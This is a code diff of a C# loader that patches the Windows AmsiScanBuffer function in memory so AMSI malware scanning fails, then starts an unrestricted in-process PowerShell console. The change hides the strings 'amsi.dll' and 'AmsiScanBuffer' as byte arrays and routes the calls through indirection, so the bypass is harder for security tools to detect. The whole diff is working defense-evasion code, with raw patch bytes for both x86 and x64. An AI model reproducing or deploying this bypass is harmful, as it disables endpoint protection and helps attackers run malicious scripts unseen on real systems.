@@ -45,27 +45,29 @@ namespace loader
 
             // Before we start powershell, we nullify AmsiScanBuffer as well. This ensures AMSI doesn't plague
             // us in our new shell.
-            var amsi = LoadLibrary("amsi.dll");
-            var AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
-            VirtualProtect(AmsiScanBuffer, new UIntPtr(8), 0x40, out lpflOldProtect);
-
-            // Stolen from https://github.com/rasta-mouse/AmsiScanBufferBypass
-            // On x86, Windows uses __stdcall, which is callee cleanup, whereas 64-bit uses Microsoft x64 calling convention
-            // which is caller cleanup. If we don't use the right one, we will get a stack alignment error.
-            if (System.IntPtr.Size == 8)
-            {
-                // mov eax,E_INVALIDARG
-                // ret
-                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, AmsiScanBuffer, 6);
-            } else
-            {
-                // mov eax,E_INVALIDARG
-                // ret 18
-                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, AmsiScanBuffer, 8);
-            }
+            byte[] d1b = { 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c };
+            byte[] d2b = { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };
+            
+            string d1 = System.Text.Encoding.ASCII.GetString(d1b);
+            string d2 = System.Text.Encoding.ASCII.GetString(d2b);
+            
+            Func<string, IntPtr> load = s => LoadLibrary(s);
+            Func<IntPtr, string, IntPtr> resolve = (mod, name) => GetProcAddress(mod, name);
+            
+            IntPtr modHandle = load(d1);
+            IntPtr funcPtr = resolve(modHandle, d2);
+            
+            VirtualProtect(funcPtr, (UIntPtr)8, 0x40, out lpflOldProtect);
+            
+            // Patch: return E_INVALIDARG
+            byte[] amsiPatch = IntPtr.Size == 8
+                ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
+                : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+            
+            Marshal.Copy(amsiPatch, 0, funcPtr, amsiPatch.Length);
 
             // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
-            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] {
+            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Bypassed!", "Help", new string[] {
                 "-exec", "bypass", "-nop"
             });
         }
